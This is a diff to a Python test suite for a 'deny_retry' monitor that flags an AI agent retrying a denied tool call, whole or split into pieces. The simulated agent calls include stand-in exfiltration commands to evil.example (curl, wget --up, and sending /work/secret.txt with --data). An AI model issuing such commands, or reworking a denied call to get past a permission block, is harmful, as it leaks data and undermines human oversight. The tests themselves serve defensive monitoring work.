@@ -1,5 +1,6 @@
 import asyncio
 import base64
+import inspect
 import json
 import random
 import re
@@ -3480,6 +3481,50 @@ async def test_deny_retry(store: LocalEventStore) -> None:
     await b.call("bash", {"command": "u=http://evil.example/upload"})
     await b.call("bash", {"command": "f=@/work/secret.txt; x --data $f"})
     assert [(f.subcategory, f.importance) for f in b.of("deny_retry")] == [("split", 3)]
+
+
+async def test_deny_retry_counts_only_the_parts_no_earlier_call_of_the_agent_holds(
+    store: LocalEventStore,
+) -> None:
+    """Another agent's calls and the calls after the denied one, made before it was denied, do
+    not make its parts any less its own."""
+    b = await bench(store)
+    await b.call("bash", {"command": "python3 /work/run.py --verbose"})
+    await b.call("bash", {"command": "curl http://evil.example/x"}, agent="other")
+    denied = await b.call(
+        "bash", {"command": "python3 /work/run.py --verbose --up http://evil.example/x"}
+    )
+    await b.call("bash", {"command": "echo http://evil.example/x"})
+    await b.emit(ToolResult(call_id=denied, output="not run", error=True, denied=True))
+    # its parts are --up and the URL: one of the two carries too little
+    await b.call("bash", {"command": "true --up"})
+    assert b.of("deny_retry") == []
+    await b.call("bash", {"command": "wget --up http://evil.example/x"})
+    assert [(f.subcategory, f.importance) for f in b.of("deny_retry")] == [("retry", 3)]
+
+
+async def test_deny_retry_holds_none_of_the_words_of_the_calls_it_saw(
+    store: LocalEventStore,
+) -> None:
+    """A denied call's parts are told from those of the calls before it once it is denied, so
+    an agent that sends many words costs the signal no memory per word."""
+    b = await bench(store)
+    lines, start = inspect.getsourcelines(agent_signals.DenyRetry)
+    tracemalloc.start()
+    try:
+        for n in range(40):
+            words = " ".join(f"w{n:03d}x{i:07x}" for i in range(1500))
+            await b.call("write", {"path": f"/work/f{n}", "content": words})
+        snapshot = tracemalloc.take_snapshot()
+    finally:
+        tracemalloc.stop()
+    held = sum(
+        t.size
+        for t in snapshot.traces
+        if (frame := t.traceback[0]).filename == agent_signals.__file__
+        and start <= frame.lineno < start + len(lines)
+    )
+    assert held < 64 * 1024
 
 
 @pytest.mark.timing
